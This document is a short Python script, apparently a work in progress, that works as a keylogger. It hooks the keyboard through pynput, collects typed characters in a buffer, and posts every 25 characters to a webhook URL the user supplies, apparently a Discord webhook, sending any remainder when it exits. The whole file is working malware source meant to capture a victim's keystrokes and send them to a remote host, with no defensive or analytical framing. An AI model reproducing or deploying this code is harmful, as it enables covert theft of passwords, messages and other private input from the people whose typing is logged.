#WIP kinda

import requests
from pynput import keyboard

WEBHOOK = "" #put yours here

buffah = ""
def req(text):
    payload = {"content": f"```\n{text}\n```"}
    try:
        requests.post(WEBHOOK, json=payload)
    except Exception as e:
        print(f"Error: {e}")

def press(key):
    global buffah
    try:
        buffah += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            buffah += " "
        elif key == keyboard.Key.enter:
            buffah += "\n"

    if len(buffah) >= 25:
        req(buffah)
        buffah = ""

try:
    with keyboard.Listener(on_press=press) as listener:
        listener.join()

finally:
    if buffah:
        req(buffah)
